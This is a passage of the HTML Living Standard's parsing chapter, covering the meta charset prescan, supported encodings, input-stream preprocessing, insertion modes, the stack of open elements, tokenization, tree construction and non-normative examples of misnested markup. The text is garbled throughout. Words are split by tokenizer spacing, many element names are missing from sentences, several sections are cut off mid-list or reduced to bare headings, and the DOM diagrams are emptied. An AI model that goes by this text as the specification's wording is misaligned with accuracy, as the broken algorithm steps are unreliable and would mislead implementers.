A sequence of bytes starting with : 0x3C , 0x4D or 0x6D , 0x45 or 0x65 , 0x54 or 0x74 , 0x41 or 0x61 , and one of 0x09 , 0x0A , 0x0C , 0x0D , 0x20 , 0x2 F ( case - insensitive ASCII '< meta ' followed by a space or slash )
Advance the position pointer so that it points at the next 0x09 , 0x0A , 0x0C , 0x0D , 0x20 , or 0x2 F byte ( the one in sequence of characters matched above ) .
Let attribute list be an empty list of strings .
Let got pragma be false .
Let need pragma be null .
Let charset be the null value ( which , for the purposes of this algorithm , is distinct from an unrecognized encoding or the empty string ) .
Attributes : Get an attribute and its value .
If no attribute was sniffed , then jump to the processing step below .
If the attribute 's name is already in attribute list , then return to the step labeled attributes .
Add the attribute 's name to attribute list .
Run the appropriate step from the following list , if one applies :
If the attribute 's name is " http-equiv " If the attribute 's value is " content - type " , then set got pragma to true .
If the attribute 's name is " content " Apply the algorithm for extracting a character encoding from a meta element , giving the attribute 's value as the string to parse .
If a character encoding is returned , and if charset is still set to null , let charset be the encoding returned , and set need pragma to true .
If the attribute 's name is " charset " Let charset be the result of getting an encoding from the attribute 's value , and set need pragma to false .
Return to the step labeled attributes .
Processing :
If need pragma is null , then jump to the step below labeled next byte .
If need pragma is true but got pragma is false , then jump to the step below labeled next byte .
If charset is failure , then jump to the step below labeled next byte .
If charset is UTF - 16BE / LE , then set charset to UTF - 8 .
If charset is x-user - defined , then set charset to windows - 1252 .
Abort the prescan a byte stream to determine its encoding algorithm , returning the encoding given by charset .
A sequence of bytes starting with a 0x3C byte ( < ) , optionally a 0x2 F byte ( / ) , and finally a byte in the range 0x41 - 0x5A or 0x61 - 0x7A ( A - Z or a - z ) Advance the position pointer so that it points at the next 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , 0x20 ( SP ) , or 0x3E ( > ) byte .
Repeatedly get an attribute until no further attributes can be found , then jump to the step below labeled next byte .
A sequence of bytes starting with : 0x3C 0x21 ( ` <! `)
A sequence of bytes starting with : 0x3C 0x2 F ( ` </ `)
A sequence of bytes starting with : 0x3C 0x3 F ( ` <? `)
Advance the position pointer so that it points at the first 0x3E byte ( > ) that comes after the 0x3C byte that was found .
Any other byte Do nothing with that byte .
Next byte :
Move position so it points at the next byte in the input byte stream , and return to the step above labeled loop .
When the prescan a byte stream to determine its encoding algorithm says to get an attribute , it means doing this :
If the byte at position is one of 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , 0x20 ( SP ) , or 0x2 F ( / ) then advance position to the next byte and redo this step .
If the byte at position is 0x3E ( > ) , then abort the get an attribute algorithm .
There is n't one .
Otherwise , the byte at position is the start of the attribute name .
Let attribute name and attribute value be the empty string .
Process the byte at position as follows :
If it is 0x3D ( = ) , and the attribute name is longer than the empty string Advance position to the next byte and jump to the step below labeled value .
If it is 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , or 0x20 ( SP ) Jump to the step below labeled spaces .
If it is 0x2 F ( / ) or 0x3E ( >)
Abort the get an attribute algorithm .
The attribute 's name is the value of attribute name , its value is the empty string .
If it is in the range 0x41 ( A ) to 0x5A ( Z ) Append the code point b +0x20 to attribute name ( where b is the value of the byte at position ) .
( This converts the input to lowercase . )
Anything else Append the code point with the same value as the byte at position to attribute name .
( It does n't actually matter how bytes outside the ASCII range are handled here , since only ASCII bytes can contribute to the detection of a character encoding . )
Advance position to the next byte and return to the previous step .
Spaces :
If the byte at position is one of 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , or 0x20 ( SP ) then advance position to the next byte , then , repeat this step .
If the byte at position is not 0x3D ( = ) , abort the get an attribute algorithm .
The attribute 's name is the value of attribute name , its value is the empty string .
Advance position past the 0x3D ( = ) byte .
Value :
If the byte at position is one of 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , or 0x20 ( SP ) then advance position to the next byte , then , repeat this step .
Process the byte at position as follows :
If it is 0x22 ( " ) or 0x27 ( ')
Let b be the value of the byte at position .
Quote loop : Advance position to the next byte .
If the value of the byte at position is the value of b , then advance position to the next byte and abort the " get an attribute " algorithm .
The attribute 's name is the value of attribute name , and its value is the value of attribute value .
Otherwise , if the value of the byte at position is in the range 0x41 ( A ) to 0x5A ( Z ) , then append a code point to attribute value whose value is 0x20 more than the value of the byte at position .
Otherwise , append a code point to attribute value whose value is the same as the value of the byte at position .
Return to the step above labeled quote loop .
If it is 0x3E ( >)
Abort the get an attribute algorithm .
The attribute 's name is the value of attribute name , its value is the empty string .
If it is in the range 0x41 ( A ) to 0x5A ( Z ) Append a code point b +0x20 to attribute value ( where b is the value of the byte at position ) .
Advance position to the next byte .
Anything else Append a code point with the same value as the byte at position to attribute value .
Advance position to the next byte .
Process the byte at position as follows :
If it is 0x09 ( HT ) , 0x0A ( LF ) , 0x0C ( FF ) , 0x0D ( CR ) , 0x20 ( SP ) , or 0x3E ( >)
Abort the get an attribute algorithm .
The attribute 's name is the value of attribute name and its value is the value of attribute value .
If it is in the range 0x41 ( A ) to 0x5A ( Z ) Append a code point b +0x20 to attribute value ( where b is the value of the byte at position ) .
Anything else Append a code point with the same value as the byte at position to attribute value .
Advance position to the next byte and return to the previous step .
For the sake of interoperability , user agents should not use a pre-scan algorithm that returns different results than the one described above .
( But , if you do , please at least let us know , so that we can improve this algorithm and benefit everyone ... )
12.2.3.3 Character encodings
User agents must support the encodings defined in Encoding , including , but not limited to , UTF - 8 , ISO - 8859 - 2 , ISO - 8859 -7 , ISO - 8859 - 8 , windows - 874 , windows - 1250 , windows - 1251 , windows - 1252 , windows - 1254 , windows - 1255 , windows - 1256 , windows - 1257 , windows - 1258 , gb18030 , Big5 , ISO - 2022 - JP , Shift_JIS , EUC-KR , UTF - 16BE/LE , and x-user - defined .
User agents must not support other encodings .
The above prohibits supporting , for example , CESU - 8 , UTF - 7 , BOCU - 1 , SCSU , EBCDIC , and UTF - 32 .
This specification does not make any attempt to support prohibited encodings in its algorithms ; support and use of prohibited encodings would thus lead to unexpected behavior .
[ CESU8 ] [ UTF7 ] [ BOCU1 ] [ SCSU ]
12.2.3.4
Changing the encoding while parsing
When the parser requires the user agent to change the encoding , it must run the following steps .
This might happen if the encoding sniffing algorithm described above failed to find a character encoding , or if it found a character encoding that was not the actual encoding of the file .
If the encoding that is already being used to interpret the input stream is UTF - 16BE / LE , then set the confidence to certain and return .
The new encoding is ignored ; if it was anything but the same encoding , then it would be clearly incorrect .
If the new encoding is UTF - 16BE / LE , then change it to UTF - 8 .
If the new encoding is x-user - defined , then change it to windows - 1252 .
If the new encoding is identical or equivalent to the encoding that is already being used to interpret the input stream , then set the confidence to certain and return .
This happens when the encoding information found in the file matches what the encoding sniffing algorithm determined to be the encoding , and in the second pass through the parser if the first pass found that the encoding sniffing algorithm described in the earlier section failed to find the right encoding .
If all the bytes up to the last byte converted by the current decoder have the same Unicode interpretations in both the current encoding and the new encoding , and if the user agent supports changing the converter on the fly , then the user agent may change to the new converter for the encoding on the fly .
Set the document 's character encoding and the encoding used to convert the input stream to the new encoding , set the confidence to certain , and return .
Otherwise , navigate to the document again , with history Handling set to " replace " , and using the same source browsing context , but this time skip the encoding sniffing algorithm and instead just set the encoding to the new encoding and the confidence to certain .
Whenever possible , this should be done without actually contacting the network layer ( the bytes should be re-parsed from memory ) , even if , e.g. , the document is marked as not being cacheable .
If this is not possible and contacting the network layer would involve repeating a request that uses a method other than ` GET ` , then instead set the confidence to certain and ignore the new encoding .
The resource will be misinterpreted .
User agents may notify the user of the situation , to aid in application development .
This algorithm is only invoked when a new encoding is found declared on a meta element .
12.2.3.5 Preprocessing the input stream
The input stream consists of the characters pushed into it as the input byte stream is decoded or from the various APIs that directly manipulate the input stream .
Any occurrences of surrogates are surrogate - in - input - stream parse errors .
Any occurrences of noncharacters are noncharacter - in - input - stream parse errors and any occurrences of controls other than ASCII whitespace and U+0000 NULL characters are control - character - in - input - stream parse errors .
The handling of U+0000 NULL characters varies based on where the characters are found and happens at the later stages of the parsing .
They are either ignored or , for security reasons , replaced with a U+ FFFD REPLACEMENT CHARACTER .
This handling is , by necessity , spread across both the tokenization stage and the tree construction stage .
Before the tokenization stage , the input stream must be preprocessed by normalizing newlines .
Thus , newlines in HTML DOMs are represented by U+000A LF characters , and there are never any U+000D CR characters in the input to the tokenization stage .
The next input character is the first character in the input stream that has not yet been consumed or explicitly ignored by the requirements in this section .
Initially , the next input character is the first character in the input .
The current input character is the last character to have been consumed .
The insertion point is the position ( just before a character or just before the end of the input stream ) where content inserted using document .
write ( ) is actually inserted .
The insertion point is relative to the position of the character immediately after it , it is not an absolute offset into the input stream .
Initially , the insertion point is undefined .
The " EOF " character in the tables below is a conceptual character representing the end of the input stream .
If the parser is a script - created parser , then the end of the input stream is reached when an explicit " EOF " character ( inserted by the document.
close ( ) method ) is consumed .
Otherwise , the " EOF " character is not a real character in the stream , but rather the lack of any further characters .
12.2.4 Parse state
12.2.4.1
The insertion mode
The insertion mode is a state variable that controls the primary operation of the tree construction stage .
Initially , the insertion mode is " initial " .
It can change to " before html " , " before head " , " in head " , " in head noscript " , " after head " , " in body " , " text " , " in table " , " in table text " , " in caption " , " in column group " , " in table body " , " in row " , " in cell " , " in select " , " in select in table " , " in template " , " after body " , " in frameset " , " after frameset " , " after after body " , and " after after frameset " during the course of the parsing , as described in the tree construction stage .
The insertion mode affects how tokens are processed and whether CDATA sections are supported .
Several of these modes , namely " in head " , " in body " , " in table " , and " in select " , are special , in that the other modes defer to them at various times .
When the algorithm below says that the user agent is to do something " using the rules for the m insertion mode " , where m is one of these modes , the user agent must use the rules described under the m insertion mode 's section , but must leave the insertion mode unchanged unless the rules in m themselves switch the insertion mode to a new value .
When the insertion mode is switched to " text " or " in table text " , the original insertion mode is also set .
This is the insertion mode to which the tree construction stage will return .
Similarly , to parse nested template elements , a stack of template insertion modes is used .
It is initially empty .
The current template insertion mode is the insertion mode that was most recently added to the stack of template insertion modes .
The algorithms in the sections below will push insertion modes onto this stack , meaning that the specified insertion mode is to be added to the stack , and pop insertion modes from the stack , which means that the most recently added insertion mode must be removed from the stack .
When the steps below require the UA to reset the insertion mode appropriately , it means the UA must follow these steps :
12.2.4.2
The stack of open elements
Initially , the stack of open elements is empty .
The stack grows downwards ; the topmost node on the stack is the first one added to the stack , and the bottommost node of the stack is the most recently added node in the stack ( notwithstanding when the stack is manipulated in a random access fashion as part of the handling for misnested tags ) .
The " before html " insertion mode creates the html document element , which is then added to the stack .
In the fragment case , the stack of open elements is initialized to contain an html element that is created as part of that algorithm .
( The fragment case skips the " before html " insertion mode . )
The html node , however it is created , is the topmost node of the stack .
It only gets popped off the stack when the parser finishes .
The current node is the bottommost node in this stack of open elements .
The adjusted current node is the context element if the parser was created as part of the HTML fragment parsing algorithm and the stack of open elements has only one element in it ( fragment case ) ; otherwise , the adjusted current node is the current node .
Elements in the stack of open elements fall into the following categories :
Typically , the special elements have the start and end tag tokens handled specifically , while ordinary elements ' tokens fall into " any other start tag " and " any other end tag " clauses , and some parts of the tree builder check if a particular element in the stack of open elements is in the special category .
However , some elements ( e.g. , the option element ) have their start or end tag tokens handled specifically , but are still not in the special category , so that they get the ordinary handling elsewhere .
The stack of open elements is said to have an element target node in a specific scope consisting of a list of element types list when the following algorithm terminates in a match state :
Initialize node to be the current node ( the bottommost node of the stack ) .
If node is the target node , terminate in a match state .
Otherwise , if node is one of the element types in list , terminate in a failure state .
Otherwise , set node to the previous entry in the stack of open elements and return to step 2 .
( This will never fail , since the loop will always terminate in the previous step if the top of the stack — an html element — is reached . )
The stack of open elements is said to have a particular element in scope when it has that element in the specific scope consisting of the following element types :
The stack of open elements is said to have a particular element in list item scope when it has that element in the specific scope consisting of the following element types :
The stack of open elements is said to have a particular element in button scope when it has that element in the specific scope consisting of the following element types :
The stack of open elements is said to have a particular element in table scope when it has that element in the specific scope consisting of the following element types :
The stack of open elements is said to have a particular element in select scope when it has that element in the specific scope consisting of all element types except the following :
Nothing happens if at any time any of the elements in the stack of open elements are moved to a new location in , or removed from , the Document tree .
In particular , the stack is not changed in this situation .
This can cause , amongst other strange effects , content to be appended to nodes that are no longer in the DOM .
In some cases ( namely , when closing misnested formatting elements ) , the stack is manipulated in a random - access fashion .
12.2.4.3
The list of active formatting elements
Initially , the list of active formatting elements is empty .
It is used to handle mis-nested formatting element tags .
The list contains elements in the formatting category , and markers .
The markers are inserted when entering applet , object , marquee , template , td , th , and caption elements , and are used to prevent formatting from " leaking " into applet , object , marquee , template , td , th , and caption elements .
In addition , each element in the list of active formatting elements is associated with the token for which it was created , so that further elements can be created for that token if necessary .
When the steps below require the UA to push onto the list of active formatting elements an element element , the UA must perform the following steps :
If there are already three elements in the list of active formatting elements after the last marker , if any , or anywhere in the list if there are no markers , that have the same tag name , namespace , and attributes as element , then remove the earliest such element from the list of active formatting elements .
For these purposes , the attributes must be compared as they were when the elements were created by the parser ; two elements have the same attributes if all their parsed attributes can be paired such that the two attributes in each pair have identical names , namespaces , and values ( the order of the attributes does not matter ) .
This is the Noah 's Ark clause .
But with three per family instead of two .
Add element to the list of active formatting elements .
When the steps below require the UA to reconstruct the active formatting elements , the UA must perform the following steps :
This has the effect of reopening all the formatting elements that were opened in the current body , cell , or caption ( whichever is youngest ) that have n't been explicitly closed .
The way this specification is written , the list of active formatting elements always consists of elements in chronological order with the least recently added element first and the most recently added element last ( except for while steps 7 to 10 of the above algorithm are being executed , of course ) .
When the steps below require the UA to clear the list of active formatting elements up to the last marker , the UA must perform the following steps :
Let entry be the last ( most recently added ) entry in the list of active formatting elements .
Remove entry from the list of active formatting elements .
If entry was a marker , then stop the algorithm at this point .
The list has been cleared up to the last marker .
Go to step 1 .
12.2.4.4
The element pointers
Initially , the head element pointer and the form element pointer are both null .
Once a head element has been parsed ( whether implicitly or explicitly ) the head element pointer gets set to point to this node .
The form element pointer points to the last form element that was opened and whose end tag has not yet been seen .
It is used to make form controls associate with forms in the face of dramatically bad markup , for historical reasons .
It is ignored inside template elements .
12.2.4.5
Other parsing state flags
The scripting flag is set to " enabled " if scripting was enabled for the Document with which the parser is associated when the parser was created , and " disabled " otherwise .
The scripting flag can be enabled even when the parser was created as part of the HTML fragment parsing algorithm , even though script elements do n't execute in that case .
The frameset - ok flag is set to " ok " when the parser is created .
It is set to " not ok " after certain tokens are seen .
12.2.5 Tokenization
Implementations must act as if they used the following state machine to tokenize HTML .
The state machine must start in the data state .
Most states consume a single character , which may have various side - effects , and either switches the state machine to a new state to reconsume the current input character , or switches it to a new state to consume the next character , or stays in the same state to consume the next character .
Some states have more complicated behavior and can consume several characters before switching to another state .
In some cases , the tokenizer state is also changed by the tree construction stage .
When a state says to reconsume a matched character in a specified state , that means to switch to that state , but when it attempts to consume the next input character , provide it with the current input character instead .
The exact behavior of certain states depends on the insertion mode and the stack of open elements .
Certain states also use a temporary buffer to track progress , and the character reference state uses a return state to return to the state it was invoked from .
The output of the tokenization step is a series of zero or more of the following tokens : DOCTYPE , start tag , end tag , comment , character , end - of - file .
DOCTYPE tokens have a name , a public identifier , a system identifier , and a force - quirks flag .
When a DOCTYPE token is created , its name , public identifier , and system identifier must be marked as missing ( which is a distinct state from the empty string ) , and the force - quirks flag must be set to off ( its other state is on ) .
Start and end tag tokens have a tag name , a self - closing flag , and a list of attributes , each of which has a name and a value .
When a start or end tag token is created , its self - closing flag must be unset ( its other state is that it be set ) , and its attributes list must be empty .
Comment and character tokens have data .
When a token is emitted , it must immediately be handled by the tree construction stage .
The tree construction stage can affect the state of the tokenization stage , and can insert additional characters into the stream .
( For example , the script element can result in scripts executing and using the dynamic markup insertion APIs to insert characters into the stream being tokenized . )
Creating a token and emitting it are distinct actions .
It is possible for a token to be created but implicitly abandoned ( never emitted ) , e.g. if the file ends unexpectedly while processing the characters that are being parsed into a start tag token .
When a start tag token is emitted with its self - closing flag set , if the flag is not acknowledged when it is processed by the tree construction stage , that is a non - void - html - element - start - tag - with - trailing - solidus parse error .
When an end tag token is emitted with attributes , that is an end - tag - with - attributes parse error .
When an end tag token is emitted with its self - closing flag set , that is an end - tag - with - trailing - solidus parse error .
An appropriate end tag token is an end tag token whose tag name matches the tag name of the last start tag to have been emitted from this tokenizer , if any .
If no start tag has been emitted from this tokenizer , then no end tag token is appropriate .
A character reference is said to be consumed as part of an attribute if the return state is either attribute value ( double - quoted ) state , attribute value ( single - quoted ) state or attribute value ( unquoted ) state .
When a state says to flush code points consumed as a character reference , it means that for each code point in the temporary buffer ( in the order they were added to the buffer ) user agent must append the code point from the buffer to the current attribute 's value if the character reference was consumed as part of an attribute , or emit the code point as a character token otherwise .
Before each step of the tokenizer , the user agent must first check the parser pause flag .
If it is true , then the tokenizer must abort the processing of any nested invocations of the tokenizer , yielding control back to the caller .
The tokenizer state machine consists of the states defined in the following subsections .
12.2.5.1 Data state

Consume the next input character :
12.2.5.32
Before attribute name state
Consume the next input character :
12.2.5.33 Attribute name state
Consume the next input character :
When the user agent leaves the attribute name state ( and before emitting the tag token , if appropriate ) , the complete attribute 's name must be compared to the other attributes on the same token ; if there is already an attribute on the token with the exact same name , then this is a duplicate - attribute parse error and the new attribute must be removed from the token .
If an attribute is so removed from a token , it , and the value that gets associated with it , if any , are never subsequently used by the parser , and are therefore effectively discarded .
Removing the attribute in this way does not change its status as the " current attribute " for the purposes of the tokenizer , however .
12.2.5.34

12.2.6
Tree construction
The input to the tree construction stage is a sequence of tokens from the tokenization stage .
The tree construction stage is associated with a DOM Document object when a parser is created .
The " output " of this stage consists of dynamically modifying or extending that document 's DOM tree .
This specification does not define when an interactive user agent has to render the Document so that it is available to the user , or when it has to begin accepting user input .
As each token is emitted from the tokenizer , the user agent must follow the appropriate steps from the following list , known as the tree construction dispatcher :
The next token is the token that is about to be processed by the tree construction dispatcher ( even if the token is subsequently just ignored ) .
A node is a MathML text integration point if it is one of the following elements :
A node is an HTML integration point if it is one of the following elements :
If the node in question is the context element passed to the HTML fragment parsing algorithm , then the start tag token for that element is the " fake " token created during by that HTML fragment parsing algorithm .
Not all of the tag names mentioned below are conformant tag names in this specification ; many are included to handle legacy content .
They still form part of the algorithm that implementations are required to implement to claim conformance .
The algorithm described below places no limit on the depth of the DOM tree generated , or on the length of tag names , attribute names , attribute values , Text nodes , etc .
While implementers are encouraged to avoid arbitrary limits , it is recognized that practical concerns will likely force user agents to impose nesting depth constraints .
12.2.6.1 Creating and inserting nodes
While the parser is processing a token , it can enable or disable foster parenting .
This affects the following algorithm .
The appropriate place for inserting a node , optionally using a particular override target , is the position in an element returned by running the following steps :
When the steps below require the UA to create an element for a token in a particular given namespace and with a particular intended parent , the UA must run the following steps :
When the steps below require the user agent to insert a foreign element for a token in a given namespace , the user agent must run these steps :
When the steps below require the user agent to insert an HTML element for a token , the user agent must insert a foreign element for the token , in the HTML namespace .
When the steps below require the user agent to adjust MathML attributes for a token , then , if the token has an attribute named definitionurl , change its name to definitionURL ( note the case difference ) .
When the steps below require the user agent to adjust SVG attributes for a token , then , for each attribute on the token whose attribute name is one of the ones in the first column of the following table , change the attribute 's name to the name given in the corresponding cell in the second column .
( This fixes the case of SVG attributes that are not all lowercase . )
Attribute name on token Attribute name on element attributename attributeName attributetype attributeType basefrequency baseFrequency baseprofile baseProfile calcmode calcMode clippathunits clipPathUnits diffuseconstant diffuseConstant edgemode edgeMode filterunits filterUnits glyphref glyphRef gradienttransform gradientTransform gradientunits gradientUnits kernelmatrix kernelMatrix kernelunitlength kernelUnitLength keypoints keyPoints keysplines keySplines keytimes keyTimes lengthadjust lengthAdjust limitingconeangle limitingConeAngle markerheight marker Height markerunits markerUnits markerwidth markerWidth maskcontentunits maskContentUnits maskunits maskUnits numoctaves numOctaves pathlength pathLength patterncontentunits patternContentUnits patterntransform patternTransform patternunits patternUnits pointsatx points AtX pointsaty points

When the steps below require the user agent to adjust foreign attributes for a token , then , if any of the attributes on the token match the strings given in the first column of the following table , let the attribute be a namespaced attribute , with the prefix being the string given in the corresponding cell in the second column , the local name being the string given in the corresponding cell in the third column , and the namespace being the namespace given in the corresponding cell in the fourth column .
( This fixes the use of namespaced attributes , in particular lang attributes in the XML namespace . )
When the steps below require the user agent to insert a character while processing a token , the user agent must run the following steps :
Let data be the characters passed to the algorithm , or , if no characters were explicitly specified , the character of the character token being processed .
Let the adjusted insertion location be the appropriate place for inserting a node .
If the adjusted insertion location is in a Document node , then return .
The DOM will not let Document nodes have Text node children , so they are dropped on the floor .
If there is a Text node immediately before the adjusted insertion location , then append data to that Text node 's data .
Otherwise , create a new Text node whose data is data and whose node document is the same as that of the element in which the adjusted insertion location finds itself , and insert the newly created node at the adjusted insertion location .
Here are some sample inputs to the parser and the corresponding number of Text nodes that they result in , assuming a user agent that executes scripts .
Input Number of Text nodes A < script > var script = document .
getElementsByTagName ( ' script ' ) [ 0 ] ; document .
body .
removeChild ( script ) ; </ script > B One
Text node in the document , containing " AB " .
A < script > var text = document .
createTextNode ( ' B ' ) ; document .
body .
appendChild ( text ) ; </ script > C Three
Text nodes ; " A " before the script , the script 's contents , and " BC " after the script ( the parser appends to the Text node created by the script ) .
A < script > var text = document .
getElementsByTagName ( ' script ' ) [ 0 ]. firstChild ; text .
data = ' B ' ; document .
body .
appendChild ( text ) ; </ script > C
Two adjacent
Text nodes in the document , containing " A " and " BC " .
A < table > B < tr > C </ tr > D </ table >
One
Text node before the table , containing " ABCD " .
( This is caused by foster parenting . )
A < table >< tr > B </ tr > C </ table >
One
Text node before the table , containing " A B C " ( A - space - B- space - C ) .
( This is caused by foster parenting . )
A < table >< tr > B </ tr > </ em > C </ table >
One
Text node before the table , containing " A BC " ( A - space - B - C ) , and one Text node inside the table ( as a child of a tbody ) with a single space character .
( Space characters separated from non-space characters by non-character tokens are not affected by foster parenting , even if those other tokens then get ignored . )
When the steps below require the user agent to while processing a comment token , optionally with an explicitly insertion position position , the user agent must run the following steps :
Let data be the data given in the comment token being processed .
If position was specified , then let the adjusted insertion location be position .
Otherwise , let adjusted insertion location be the appropriate place for inserting a node .
Create a node whose data attribute is set to data and whose node document is the same as that of the node in which the adjusted insertion location finds itself .
Insert the newly created node at the adjusted insertion location .
DOM mutation events must not fire for changes caused by the UA parsing the document .
This includes the parsing of any content inserted using document . write ( ) and document .
writeln ( ) calls .
[ UIEVENTS ]
However , mutation observers do fire , as required by DOM .
12.2.6.2
Parsing elements that contain only text
The generic raw text element parsing algorithm and the generic RCDATA element parsing algorithm consist of the following steps .
These algorithms are always invoked in response to a start tag token .
When the steps below require the UA to , then , while the is a element , a element , an element , an element , an element , a element , an element , an element , an element , or an element , the UA must pop the off the .
If a step requires the UA to generate implied end tags but lists an element to exclude from the process , then the UA must perform the above steps as if that element was not in the above list .
When the steps below require the UA to , then , while the is a element , a element , a element , a element , an element , an element , an element , a element , an element , an element , an element , an element , a element , a element , a element , a element , a element , or a element , the UA must pop the off the .
12.2.6.4
The rules for parsing tokens in HTML content
12.2.6.4.1
The " initial " insertion mode
When the user agent is to apply the rules for the " initial " insertion mode , the user agent must handle the token as follows :
A character token that is one of U+0009 CHARACTER TABULATION , U+000A LINE FEED ( LF ) , U+000C FORM FEED ( FF ) , U+000D CARRIAGE RETURN ( CR ) , or U+0020 SPACE Ignore the token .
A comment token as the last child of the Document object .
A DOCTYPE token
If the DOCTYPE token 's name is not identical to " html " , or the token 's public identifier is not missing , or the token 's system identifier is neither missing nor identical to " about : legacy - compat " , then there is a parse error .
Append a DocumentType node to the Document node , with the name attribute set to the name given in the DOCTYPE token , or the empty string if the name was missing ; the public Id attribute set to the public identifier given in the DOCTYPE token , or the empty string if the public identifier was missing ; the system Id attribute set to the system identifier given in the DOCTYPE token , or the empty string if the system identifier was missing ; and the other attributes specific to DocumentType objects set to null and empty lists as appropriate .
Associate the DocumentType node with the Document object so that it is returned as the value of the doctype attribute of the Document object .
Then , if the document is not an iframe srcdoc document , and the DOCTYPE token matches one of the conditions in the following list , then set the Document to quirks mode :
The force - quirks flag is set to on .
is set to .
The name is set to anything other than " html " ( compared identically ) .

When an application uses an HTML parser in conjunction with an XML pipeline , it is possible that the constructed DOM is not compatible with the XML tool chain in certain subtle ways .
For example , an XML toolchain might not be able to represent attributes with the name xmlns , since they conflict with the Namespaces in XML syntax .
There is also some data that the HTML parser generates that is n't included in the DOM itself .
This section specifies some rules for handling these issues .
If the XML API being used does n't support DOCTYPEs , the tool may drop DOCTYPEs altogether .
If the XML API does n't support attributes in no namespace that are named " xmlns " , attributes whose names start with " xmlns : " , or attributes in the XMLNS namespace , then the tool may drop such attributes .
The tool may annotate the output with any namespace declarations required for proper operation .
If the XML API being used restricts the allowable characters in the local names of elements and attributes , then the tool may map all element and attribute local names that the API would n't support to a set of names that are allowed , by replacing any character that is n't supported with the uppercase letter U and the six digits of the character 's code point when expressed in hexadecimal , using digits 0 - 9 and capital letters A - F as the symbols , in increasing numeric order .
For example , the element name foo < bar , which can be output by the HTML parser , though it is neither a legal HTML element name nor a well - formed XML element name , would be converted into fooU00003 Cbar , which is a well - formed XML element name ( though it 's still not legal in HTML by any means ) .
As another example , consider the attribute xlink : href .
Used on a MathML element , it becomes , after being adjusted , an attribute with a prefix " xlink " and a local name " href " .
However , used on an HTML element , it becomes an attribute with no prefix and the local name " xlink : href " , which is not a valid NCName , and thus might not be accepted by an XML API .
It could thus get converted , becoming " xlinkU00003 Ahref " .
The resulting names from this conversion conveniently can't clash with any attribute generated by the HTML parser , since those are all either lowercase or those listed in the adjust foreign attributes algorithm 's table .
If the XML API restricts comments from having two consecutive U+002D HYPHEN - MINUS characters ( -- ) , the tool may insert a single U+0020 SPACE character between any such offending characters .
If the XML API restricts comments from ending in a U+002D HYPHEN - MINUS character ( - ) , the tool may insert a single U+0020 SPACE character at the end of such comments .
If the XML API restricts allowed characters in character data , attribute values , or comments , the tool may replace any U+000C FORM FEED ( FF ) character with a U+0020 SPACE character , and any other literal non-XML character with a U+FFFD REPLACEMENT CHARACTER .
If the tool has no way to convey out - of - band information , then the tool may drop the following information :
The mutations allowed by this section apply after the HTML parser 's rules have been applied .
For example , a < a : :> start tag will be closed by a </a ::> end tag , and never by a </ aU00003AU00003A > end tag , even if the user agent is using the rules above to then generate an actual element in the DOM with the name a U00003AU00003A for that start tag .
12.2.9
An introduction to error handling and strange cases in the parser
This section is non-normative .
This section examines some erroneous markup and discusses how the HTML parser handles these cases .
This section is non-normative .
The most - often discussed example of erroneous markup is as follows :
< p > 1 < b > 2 < i > 3 </ b > 4 </ i > 5 </ p >
The parsing of this markup is straightforward up to the " 3 " .
At this point , the DOM looks like this :
: 1 : 2 : 3
Here , the has five elements on it : , , , , and .
The just has two : and .
The is " " .
Upon receiving the end tag token with the tag name " b " , the " adoption agency algorithm " is invoked .
This is a simple case , in that the formatting element is the element , and there is no furthest block .
Thus , the ends up with just three elements : , , and , while the has just one : .
The DOM tree is unmodified at this point .
The next token is a character ( " 4 " ) , triggers the , in this case just the element .
A new element is thus created for the " 4 " node .
After the end tag token for the " i " is also received , and the " 5 " node is inserted , the DOM looks as follows :
: 1 : 2 : 3 : 4 : 5
This section is non-normative .
A case similar to the previous one is the following :
< b > 1 < p > 2 </ b > 3 </ p >
Up to the " 2 " the parsing here is straightforward :
: 1 : 2
The interesting part is when the end tag token with the tag name " b " is parsed .
Before that token is seen , the has four elements on it : , , , and .
The just has the one : .
The is " " .
Upon receiving the end tag token with the tag name " b " , the " adoption agency algorithm " is invoked , as in the previous example .
However , in this case , there is a furthest block , namely the element .
Thus , this time the adoption agency algorithm is n't skipped over .
The common ancestor is the element .
A conceptual " bookmark " marks the position of the in the , but since that list has only one element in it , the bookmark wo n't have much effect .
As the algorithm progresses , node ends up set to the formatting element ( ) , and last node ends up set to the furthest block ( ) .
The last node gets appended ( moved ) to the common ancestor , so that the DOM looks like :
: 1 : 2
A new element is created , and the children of the element are moved to it :
: 1
: 2
Finally , the new element is appended to the element , so that the DOM looks like :
: 1 : 2
The element is removed from the and the , so that when the " 3 " is parsed , it is appended to the element :
: 1 : 2 : 3
12.2.9.3 Unexpected markup in tables
This section is non-normative .
Error handling in tables is , for historical reasons , especially strange .
For example , consider the following markup :
< table > < b > < tr >< td > aaa </ td ></ tr > bbb </ table > ccc
The highlighted b element start tag is not allowed directly inside a table like that , and the parser handles this case by placing the element before the table .
( This is called foster parenting . )
This can be seen by examining the DOM tree as it stands just after the table element 's start tag has been seen :
... and then immediately after the b element start tag has been seen :
At this point , the stack of open elements has on it the elements html , body , table , and b ( in that order , despite the resulting DOM tree ) ; the list of active formatting elements just has the b element in it ; and the insertion mode is " in table " .
The tr start tag causes the b element to be popped off the stack and a tbody start tag to be implied ; the tbody and tr elements are then handled in a rather straight - forward manner , taking the parser through the " in table body " and " in row " insertion modes , after which the DOM looks as follows :
Here , the stack of open elements has on it the elements html , body , table , tbody , and tr ; the list of active formatting elements still has the b element in it ; and the insertion mode is " in row " .
The td element start tag token , after putting a td element on the tree , puts a marker on the list of active formatting elements ( it also switches to the " in cell " insertion mode ) .
The marker means that when the " aaa " character tokens are seen , no b element is created to hold the resulting Text node :
The end tags are handled in a straight - forward manner ; after handling them , the stack of open elements has on it the elements html , body , table , and tbody ; the list of active formatting elements still has the b element in it ( the marker having been removed by the " td " end tag token ) ; and the insertion mode is " in table body " .
Thus it is that the " bbb " character tokens are found .
These trigger the " in table text " insertion mode to be used ( with the original insertion mode set to " in table body " ) .
The character tokens are collected , and when the next token ( the table element end tag ) is seen , they are processed as a group .
Since they are not all spaces , they are handled as per the " anything else " rules in the " in table " insertion mode , which defer to the " in body " insertion mode but with foster parenting .
